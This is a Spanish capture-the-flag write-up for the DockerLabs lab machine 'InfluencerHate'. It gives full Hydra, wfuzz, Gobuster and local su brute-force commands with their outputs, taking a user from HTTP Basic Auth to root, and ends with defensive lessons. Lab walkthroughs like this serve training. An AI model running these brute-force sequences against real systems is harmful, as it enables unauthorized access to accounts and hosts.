# InfluencerHate — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 28/06/2025  
**Técnicas:** Nmap · HTTP Basic Auth · Hydra · Burp Suite · Gobuster con auth · wfuzz · SCP · Linux-Su-Force · Privesc (root fuerza bruta local)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [HTTP Basic Auth — Hydra con lista de combinaciones](#2-http-basic-auth--hydra-con-lista-de-combinaciones)
3. [Burp Suite — extraer cabecera Authorization](#3-burp-suite--extraer-cabecera-authorization)
4. [Gobuster autenticado — descubrimiento de login.php](#4-gobuster-autenticado--descubrimiento-de-loginphp)
5. [wfuzz — fuerza bruta en formulario web](#5-wfuzz--fuerza-bruta-en-formulario-web)
6. [Acceso SSH como balutin y escalada a root](#6-acceso-ssh-como-balutin-y-escalada-a-root)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh influencerhate.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
| HTTP/1.1 401 Unauthorized
|_Basic realm=Zona restringida
|_http-title: 401 Unauthorized\xB0
```

El puerto 80 pide **HTTP Basic Auth** — usuario y contraseña antes de acceder.

---

## 2. HTTP Basic Auth — Hydra con lista de combinaciones

HTTP Basic Auth combina usuario:contraseña en Base64 en la cabecera `Authorization`. Usamos Hydra con una lista de combinaciones conocidas:

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  172.17.0.2 -s 80 http-get /
```

```
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
1 of 1 target successfully completed, 1 valid password found
```

Credenciales HTTP Basic: **httpadmin:fhttpadmin**

> 💡 `-C` en Hydra usa un fichero de combinaciones `usuario:contraseña` en cada línea, en lugar de dos listas separadas. Ideal para Basic Auth donde las credenciales por defecto son predecibles.

---

## 3. Burp Suite — extraer cabecera Authorization

Accedemos a la web con las credenciales. Capturamos la petición con Burp para ver la cabecera `Authorization`:

```
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
```

Decodificamos: `aHR0cGFkbWluOmZodHRwYWRtaW4=` → **httpadmin:fhttpadmin**. Necesitamos esta cabecera para todas las peticiones posteriores.

---

## 4. Gobuster autenticado — descubrimiento de login.php

Con la cabecera de autenticación, lanzamos Gobuster:

```bash
sudo gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,py,txt \
  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
  -t 100 -k -r
```

```
/login.php    (Status: 200) [Size: 3798]
/index.html   (Status: 200) [Size: 10791]
```

Visitamos `http://172.17.0.2/login.php` — "Área privada. Prohibido el paso si eres youtuber de ciberseguridad." Formulario POST con usuario y contraseña.

---

## 5. wfuzz — fuerza bruta en formulario web

Capturamos la petición POST con Burp para ver el cuerpo: `username=admin&password=admin`. Usamos wfuzz para bruteforcear la contraseña del usuario `admin`:

```bash
wfuzz -c \
  -z file,/usr/share/wordlists/rockyou.txt \
  -t 50 \
  --hh=2848 \
  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  http://172.17.0.2/login.php
```

```
ID       Response   Lines   Word    Chars       Payload
00000027   200       84 l    216 W   1023 Ch     "chocolate"
```

> 💡 **`--hh=2848`** oculta las respuestas con ese número de caracteres — el tamaño de la página "login fallido". Solo muestra respuestas diferentes, que indican login exitoso.

El login exitoso muestra: **"¡Login correcto! De parte del usuario balutin, te damos la enhorabuena"**

---

## 6. Acceso SSH como balutin y escalada a root

Con el nombre de usuario **balutin** identificado, buscamos su contraseña SSH con Hydra:

```bash
hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
```

```bash
ssh balutin@172.17.0.2
balutin@172.17.0.2's password: estrella
balutin@63c3216c49b7:~$
```

Sin escalada directa por sudo o SUID. Transferimos **Linux-Su-Force** via SCP:

```bash
scp rockyou.txt balutin@172.17.0.2:/home/balutin
scp Linux-Su-Force.sh balutin@172.17.0.2:/home/balutin
```

Ejecutamos fuerza bruta local contra root:

```bash
balutin@63c3216c49b7:~$ ./Linux-Su-Force.sh root rockyou.txt
Contraseña encontrada para el usuario root: rockyou
```

```bash
balutin@63c3216c49b7:~$ su root
Password: rockyou
root@63c3216c49b7:/home/balutin# whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **HTTP Basic Auth con credenciales por defecto** | Puerto 80 | Bypass de autenticación de primer nivel |
| **Formulario web con contraseña débil (chocolate)** | `/login.php` | Revelación del usuario balutin |
| **Contraseña SSH débil (estrella)** | Usuario balutin | Acceso al sistema |
| **Contraseña de root trivial (rockyou)** | Usuario root | Escalada completa |

**Para defenderse:**
- HTTP Basic Auth con credenciales por defecto es la primera cosa que un atacante prueba.
- Evitar contraseñas de una sola palabra que aparecen en rockyou.txt — "chocolate", "estrella", "rockyou" están en las primeras posiciones.
- Limitar los intentos de login (rate limiting, fail2ban) para bloquear ataques de fuerza bruta locales y remotos.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
